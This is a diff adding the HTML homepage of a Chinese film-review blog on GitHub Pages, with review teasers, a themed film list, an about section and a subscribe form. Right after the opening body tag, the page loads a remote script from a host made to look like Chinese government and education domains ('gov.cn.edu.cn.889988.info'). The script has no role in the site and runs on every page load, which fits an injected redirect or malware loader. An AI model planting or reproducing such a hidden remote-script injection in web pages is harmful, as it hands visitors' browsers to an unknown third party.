@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>光影匣子影评志 | 独立影评、冷门佳片与观影指南</title>
+<meta name="description" content="光影匣子影评志，由资深影迷主理的影视原创内容平台。分享院线新片深度点评、经典老片复盘、冷门佳作挖掘与观影指南，帮你把每一次选片时间花在值得的作品上。">
+<meta name="keywords" content="光影匣子,光影匣子影评志,独立影评,电影点评,冷门佳片推荐,观影指南,院线新片,经典老片,影视资讯">
+<link rel="canonical" href="https://shenmadianyingwangwobuka-zh.github.io/">
+<style>
+:root{
+  --ink:#1a1a1f;
+  --ink-soft:#3d3d47;
+  --paper:#f6f3ec;
+  --paper-2:#efe9dd;
+  --accent:#b8452f;
+  --accent-2:#e6a15c;
+  --line:rgba(26,26,31,.12);
+  --shadow:0 18px 45px -25px rgba(26,26,31,.45);
+  --max:1180px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,-apple-system,sans-serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+  font-size:16px;
+  overflow-x:hidden;
+}
+img{display:block;max-width:100%;height:auto}
+a{color:inherit;text-decoration:none}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 22px}
+
+/* ---------- 顶部导航 ---------- */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(246,243,236,.92);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:66px;gap:18px}
+.brand{display:flex;align-items:baseline;gap:9px;flex-shrink:0}
+.brand b{font-size:21px;letter-spacing:.5px;font-weight:700}
+.brand span{font-size:12px;color:var(--ink-soft);letter-spacing:1px;border-left:1px solid var(--line);padding-left:9px}
+.nav{display:flex;gap:6px;align-items:center}
+.nav a{
+  font-size:15px;padding:8px 13px;border-radius:8px;color:var(--ink-soft);
+  transition:.2s;
+}
+.nav a:hover{background:var(--paper-2);color:var(--accent)}
+.nav-toggle{display:none;width:40px;height:40px;border:1px solid var(--line);background:transparent;border-radius:8px;cursor:pointer;align-items:center;justify-content:center;flex-direction:column;gap:5px}
+.nav-toggle i{display:block;width:18px;height:2px;background:var(--ink);border-radius:2px;transition:.25s}
+.nav-toggle.on i:nth-child(1){transform:translateY(7px) rotate(45deg)}
+.nav-toggle.on i:nth-child(2){opacity:0}
+.nav-toggle.on i:nth-child(3){transform:translateY(-7px) rotate(-45deg)}
+
+/* ---------- Hero ---------- */
+.hero{padding:74px 0 60px;position:relative}
+.hero::before{
+  content:"";position:absolute;right:-120px;top:-60px;width:420px;height:420px;
+  background:radial-gradient(circle,rgba(184,69,47,.18),transparent 65%);border-radius:50%;
+}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:54px;align-items:center;position:relative}
+.kicker{
+  display:inline-flex;align-items:center;gap:8px;font-size:13px;letter-spacing:2px;
+  color:var(--accent);text-transform:uppercase;margin-bottom:18px;
+}
+.kicker::before{content:"";width:26px;height:1px;background:var(--accent)}
+.hero h1{font-size:clamp(34px,5vw,56px);line-height:1.16;letter-spacing:-.5px;font-weight:800}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p.lead{
+  margin-top:22px;max-width:520px;font-size:17px;color:var(--ink-soft);
+}
+.hero-actions{margin-top:32px;display:flex;gap:14px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;padding:13px 26px;border-radius:999px;
+  font-size:15px;font-weight:600;transition:.25s;border:1px solid transparent;cursor:pointer;
+}
+.btn-primary{background:var(--ink);color:var(--paper)}
+.btn-primary:hover{background:var(--accent);transform:translateY(-2px);box-shadow:var(--shadow)}
+.btn-ghost{background:transparent;color:var(--ink);border-color:var(--line)}
+.btn-ghost:hover{border-color:var(--ink)}
+.hero-card{
+  background:#fff;border-radius:22px;padding:30px;box-shadow:var(--shadow);
+  border:1px solid var(--line);position:relative;
+}
+.hero-card .tag{
+  font-size:12px;letter-spacing:1px;color:#fff;background:var(--accent);
+  padding:4px 11px;border-radius:6px;display:inline-block;margin-bottom:16px;
+}
+.hero-card h3{font-size:23px;line-height:1.4;margin-bottom:10px}
+.hero-card p{font-size:14.5px;color:var(--ink-soft)}
+.hero-card .meta{margin-top:20px;padding-top:18px;border-top:1px dashed var(--line);display:flex;justify-content:space-between;font-size:13px;color:var(--ink-soft)}
+
+/* ---------- 栏目导航条 ---------- */
+.sections-nav{background:var(--ink);color:var(--paper);padding:0}
+.sections-nav .wrap{display:flex;gap:0;overflow-x:auto}
+.sections-nav a{
+  flex-shrink:0;padding:20px 26px;font-size:15px;border-bottom:2px solid transparent;
+  white-space:nowrap;opacity:.75;transition:.2s;
+}
+.sections-nav a:hover{opacity:1;border-color:var(--accent-2)}
+
+/* ---------- 通用区块 ---------- */
+section{padding:76px 0}
+.sec-head{display:flex;align-items:end;justify-content:space-between;gap:24px;margin-bottom:40px;flex-wrap:wrap}
+.sec-head .num{font-size:13px;letter-spacing:2px;color:var(--accent);font-weight:700}
+.sec-head h2{font-size:clamp(26px,3.4vw,36px);font-weight:800;line-height:1.25;margin-top:4px}
+.sec-head .sub{color:var(--ink-soft);max-width:380px;font-size:15px}
+
+/* ---------- 栏目一：最新影评 ---------- */
+.reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.review{
+  background:#fff;border-radius:16px;overflow:hidden;border:1px solid var(--line);
+  display:flex;flex-direction:column;transition:.28s;
+}
+.review:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
+.review .thumb{
+  height:180px;position:relative;display:flex;align-items:flex-end;padding:16px;
+  color:#fff;font-weight:700;font-size:13px;letter-spacing:1px;
+}
+.review:nth-child(1) .thumb{background:linear-gradient(135deg,#2c3e50,#4a6278)}
+.review:nth-child(2) .thumb{background:linear-gradient(135deg,#6b3a2a,#a85d3c)}
+.review:nth-child(3) .thumb{background:linear-gradient(135deg,#1f4e3d,#3d7a5f)}
+.review .thumb::after{
+  content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.5),transparent 60%);
+}
+.review .thumb span{position:relative;z-index:1;background:rgba(255,255,255,.18);padding:4px 10px;border-radius:5px;backdrop-filter:blur(4px)}
+.review .body{padding:22px;flex:1;display:flex;flex-direction:column}
+.review .body h3{font-size:19px;line-height:1.4;margin-bottom:10px}
+.review .body p{font-size:14.5px;color:var(--ink-soft);flex:1}
+.review .foot{margin-top:18px;padding-top:14px;border-top:1px solid var(--line);display:flex;justify-content:space-between;font-size:13px;color:var(--ink-soft)}
+.review .score{color:var(--accent);font-weight:700}
+
+/* ---------- 栏目二：片单推荐 ---------- */
+.lists{background:var(--paper-2)}
+.lists-grid{display:grid;grid-template-columns:1.1fr 1fr;gap:46px;align-items:start}
+.theme-block{border-left:3px solid var(--accent);padding-left:22px}
+.theme-block h3{font-size:22px;margin-bottom:14px}
+.theme-block p{color:var(--ink-soft);font-size:15.5px}
+.film-list{list-style:none;display:flex;flex-direction:column;gap:0}
+.film-list li{
+  display:flex;align-items:center;gap:18px;padding:18px 4px;border-bottom:1px solid var(--line);
+}
+.film-list li:last-child{border-bottom:none}
+.film-list .rank{
+  font-size:26px;font-weight:800;color:var(--paper-2);-webkit-text-stroke:1.5px var(--accent);
+  width:38px;flex-shrink:0;text-align:center;
+}
+.film-list .info{flex:1}
+.film-list .info b{display:block;font-size:16.5px}
+.film-list .info small{color:var(--ink-soft);font-size:13.5px}
+.film-list .yr{font-size:13px;color:var(--ink-soft);white-space:nowrap}
+
+/* ---------- 栏目三：关于本站 ---------- */
+.about-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.about-card{
+  background:#fff;border-radius:14px;padding:30px 24px;border:1px solid var(--line);
+  transition:.25s;
+}
+.about-card:hover{border-color:var(--accent);transform:translateY(-4px)}
+.about-card .ic{font-size:26px;margin-bottom:16px;display:block}
+.about-card h4{font-size:17px;margin-bottom:8px}
+.about-card p{font-size:14px;color:var(--ink-soft)}
+
+/* ---------- 栏目四：联系/订阅 ---------- */
+.contact{background:var(--ink);color:var(--paper)}
+.contact .sec-head .sub{color:rgba(246,243,236,.7)}
+.contact .sec-head .num{color:var(--accent-2)}
+.contact-box{
+  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.14);
+  border-radius:20px;padding:42px;display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center;
+}
+.contact-box h3{font-size:24px;line-height:1.5;font-weight:700}
+.contact-box .domain-box{
+  background:rgba(0,0,0,.25);border:1px dashed rgba(255,255,255,.25);border-radius:12px;
+  padding:22px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:15px;
+  word-break:break-all;color:var(--accent-2);
+}
+.contact-box .domain-box small{display:block;font-family:inherit;color:rgba(246,243,236,.6);font-size:13px;margin-top:8px;letter-spacing:.5px}
+.subscribe{display:flex;gap:10px;margin-top:22px;flex-wrap:wrap}
+.subscribe input{
+  flex:1;min-width:200px;padding:14px 18px;border-radius:999px;border:1px solid rgba(255,255,255,.22);
+  background:rgba(255,255,255,.08);color:var(--paper);font-size:15px;outline:none;
+}
+.subscribe input::placeholder{color:rgba(246,243,236,.5)}
+.subscribe input:focus{border-color:var(--accent-2)}
+.subscribe button{
+  padding:14px 30px;border-radius:999px;border:none;background:var(--accent-2);color:#1a1a1f;
+  font-size:15px;font-weight:700;cursor:pointer;transition:.2s;white-space:nowrap;
+}
+.subscribe button:hover{background:#f0b878;transform:translateY(-2px)}
+
+/* ---------- 页脚 ---------- */
+footer{border-top:1px solid var(--line);padding:34px 0;background:var(--paper)}
+footer .wrap{display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;font-size:13.5px;color:var(--ink-soft)}
+footer .links{display:flex;gap:20px;flex-wrap:wrap}
+
+/* ---------- 响应式 ---------- */
+@media (max-width:900px){
+  .reviews{grid-template-columns:1fr 1fr}
+  .lists-grid{grid-template-columns:1fr;gap:34px}
+  .about-grid{grid-template-columns:1fr 1fr}
+  .contact-box{grid-template-columns:1fr;padding:30px}
+}
+@media (max-width:680px){
+  .topbar .wrap{height:60px}
+  .nav{
+    position:fixed;top:60px;left:0;right:0;flex-direction:column;align-items:stretch;
+    background:var(--paper);border-bottom:1px solid var(--line);padding:14px;
+    gap:2px;transform:translateY(-130%);opacity:0;transition:.3s;pointer-events:none;
+    box-shadow:0 12px 30px -20px rgba(0,0,0,.3);
+  }
+  .nav.on{transform:translateY(0);opacity:1;pointer-events:auto}
+  .nav a{padding:13px 16px;border-radius:8px}
+  .nav-toggle{display:flex}
+  .hero{padding:46px 0 44px}
+  .hero-grid{grid-template-columns:1fr;gap:36px}
+  section{padding:52px 0}
+  .reviews,.about-grid{grid-template-columns:1fr}
+  .hero-actions .btn{flex:1;justify-content:center}
+  .contact-box{padding:24px}
+  .sec-head{margin-bottom:28px}
+}
+@media print{
+  .topbar,.nav-toggle,.sections-nav,.subscribe{display:none}
+  body{background:#fff}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <b>光影匣子</b>
+      <span>影评志</span>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#review">最新影评</a>
+      <a href="#lists">片单推荐</a>
+      <a href="#about">关于本站</a>
+      <a href="#contact">联系订阅</a>
+    </nav>
+    <button class="nav-toggle" id="navToggle" aria-label="菜单"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <div class="kicker">Film Notes &amp; Reviews</div>
+        <h1>在快节奏的时代，<br>陪你把一部好片<em>看完、看懂</em>。</h1>
+        <p class="lead">光影匣子影评志由一位写了十余年观影笔记的普通影迷维护，不做资讯搬运，不追热点流量。每一篇影评都来自实打实的观看、记录与思考，写给同样愿意为一部电影花两小时的你。</p>
+        <div class="hero-actions">
+          <a class="btn btn-primary" href="#review">读最新影评 →</a>
+          <a class="btn btn-ghost" href="#lists">看看片单</a>
+        </div>
+      </div>
+      <aside class="hero-card">
+        <span class="tag">本周主打</span>
+        <h3>《周处除三害》里的恶与救赎：一场被类型糖衣包裹的寓言</h3>
+        <p>从叙事结构、人物动机到符号隐喻，拆解这部在台湾电影市场投下重弹的作品。它到底讲了一个怎样的故事，又为何让那么多观众在结尾久久不肯离场。</p>
+        <div class="meta"><span>阅读约 12 分钟</span><span>3 条读者留言</span></div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<nav class="sections-nav">
+  <div class="wrap">
+    <a href="#review">01 · 最新影评</a>
+    <a href="#lists">02 · 片单推荐</a>
+    <a href="#about">03 · 关于本站</a>
+    <a href="#contact">04 · 联系与订阅</a>
+  </div>
+</nav>
+
+<section id="review">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="num">COLUMN 01</div>
+        <h2>最新影评</h2>
+      </div>
+      <p class="sub">每周更新 1–2 篇原创长评与短评，院线片、修复重映与流媒体新作都在观察范围内。</p>
+    </div>
+    <div class="reviews">
+      <article class="review">
+        <div class="thumb"><span>院线 · 剧情</span></div>
+        <div class="body">
+          <h3>《坠落的审判》：当婚姻成为一场需要被裁决的悬疑</h3>
+          <p>茹斯汀·特里耶用一场看似标准的法庭戏，把亲密关系中最难启齿的权力结构摊开在光线下。影片真正厉害之处，是让观众意识到自己也在参与审判。</p>
+          <div class="foot"><span>长评 · 约 9 分钟</span><span class="score">推荐 ★★★★☆</span></div>
+        </div>
+      </article>
+      <article class="review">
+        <div class="thumb"><span>流媒体 · 犯罪</span></div>
+        <div class="body">
+          <h3>《亡命雷区》：扎实的类型片手艺，被低估的年度黑马</h3>
+          <p>没有大明星、没有奇观场面，全靠节奏与表演支撑。本文从视听调度切入，谈它如何在 90 分钟里完成一次有效的情绪闭环。</p>
+          <div class="foot"><span>短评 · 约 5 分钟</span><span class="score">推荐 ★★★★</span></div>
+        </div>
+      </article>
+      <article class="review">
+        <div class="thumb"><span>经典 · 修复</span></div>
+        <div class="body">
+          <h3>重看《牯岭街少年杀人事件》：四小时，读懂一代人的沉默</h3>
+          <p>4K 修复版重返院线，给了年轻观众重新进入杨德昌世界的入口。这篇复盘不聊剧情解密，只谈影片如何塑造时间与空间的压迫感。</p>
+          <div class="foot"><span>复盘 · 约 14 分钟</span><span class="score">力荐 ★★★★★</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="lists" id="lists">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="num">COLUMN 02</div>
+        <h2>片单推荐</h2>
+      </div>
+      <p class="sub">按主题与心情整理的小体量片单，附简短入选理由，适合周末挑片时随手翻看。</p>
+    </div>
+    <div class="lists-grid">
+      <div class="theme-block">
+        <h3>「一个人看也不孤单」的八部安静电影</h3>
+        <p>这组片单是为那些想安静坐下来、不需要太多剧情刺激的夜晚准备的。它们节奏舒缓、观察细腻，看完之后不是兴奋，而是心里被轻轻垫了一下。入选标准只有一个：孤独但温柔。</p>
+        <p style="margin-top:12px">片单每季度更新一次，下一批主题暂定为「城市边缘的陌生人」。</p>
+      </div>
+      <ul class="film-list">
+        <li><span class="rank">1</span><div class="info"><b>心灵驿站</b><small>一段铁路旁的短暂停留，胜过千言万语</small></div><span class="yr">2013</span></li>
+        <li><span class="rank">2</span><div class="info"><b>这时对，那时错</b><small>洪常秀最轻盈的一次相遇练习</small></div><span class="yr">2015</span></li>
+        <li><span class="rank">3</span><div class="info"><b>平静的午后</b><small>没有事件发生的电影，也可以成立</small></div><span class="yr">2018</span></li>
+        <li><span class="rank">4</span><div class="info"><b>Burn After Reading</b><small>科恩兄弟式的荒诞，笑完会发冷</small></div><span class="yr">2008</span></li>
+        <li><span class="rank">5</span><div class="info"><b>小森林 · 夏秋篇</b><small>用一日三餐把焦虑一点点熬软</small></div><span class="yr">2014</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="num">COLUMN 03</div>
+        <h2>关于本站</h2>
+      </div>
+      <p class="sub">一个坚持手写、不接片方稿、不追热搜流量的独立影评小站，这里是它的运行方式。</p>
+    </div>
+    <div class="about-grid">
+      <div class="about-card">
+        <span class="ic">✍️</span>
+        <h4>原创为先</h4>
+        <p>全部内容由站长为笔名独立撰写，不搬运、不洗稿，转载需事先取得授权。</p>
+      </div>
+      <div class="about-card">
+        <span class="ic">🎬</span>
+        <h4>类型不设限</h4>
+        <p>文艺片、类型片、纪录片与动画并重，相信好电影不分门类，只分是否真诚。</p>
+      </div>
+      <div class="about-card">
+        <span class="ic">📅</span>
+        <h4>更新节奏</h4>
+        <p>每周稳定更新一到两篇，长短评搭配，避免日更带来的注水与敷衍。</p>
+      </div>
+      <div class="about-card">
+        <span class="ic">💬</span>
+        <h4>欢迎讨论</h4>
+        <p>有不同意见比点赞更有价值，评论区保留，争议观点会单独整理成文。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="contact" id="contact">
+  <div class="wrap">
+    <div class="sec-head">
+      <div>
+        <div class="num">COLUMN 04</div>
+        <h2>联系与订阅</h2>
+      </div>
+      <p class="sub">想推荐一部片子、聊聊某篇影评，或单纯想收信，都可以从这里找到本站。</p>
+    </div>
+    <div class="contact-box">
+      <div>
+        <h3>把观影这件事，<br>慢慢做下去。</h3>
+        <p style="margin-top:14px;color:rgba(246,243,236,.7);font-size:15px">留下邮箱，每月收到一封手写式片单信件，不发广告、不转售名单，随时可以退订。</p>
+        <form class="subscribe" onsubmit="event.preventDefault();this.querySelector('button').textContent='已收到，谢谢 ✓'">
+          <input type="email" placeholder="你的邮箱地址" required>
+          <button type="submit">订阅片单</button>
+        </form>
+      </div>
+      <div>
+        <div class="domain-box">
+          https://shenmadianyingwangwobuka-zh.github.io
+          <small>本站唯一官方地址 · 站点托管于 GitHub Pages</small>
+        </div>
+        <p style="margin-top:18px;color:rgba(246,243,236,.7);font-size:14px">合作与投稿请移步留言板，回复通常在一周内。<br>商务邮件主题请注明「光影匣子合作」。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div>© <span id="year"></span> 光影匣子影评志 · 本站内容均为原创，转载请保留出处与链接。</div>
+    <div class="links">
+      <a href="#">隐私说明</a>
+      <a href="#">转载授权</a>
+      <a href="#">友情链接</a>
+      <a href="#">回到顶部</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('year').textContent=new Date().getFullYear();
+var navToggle=document.getElementById('navToggle');
+var nav=document.getElementById('nav');
+navToggle.addEventListener('click',function(){
+  nav.classList.toggle('on');
+  navToggle.classList.toggle('on');
+});
+nav.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){
+    nav.classList.remove('on');
+    navToggle.classList.remove('on');
+  });
+});
+</script>
+</body>
+</html>
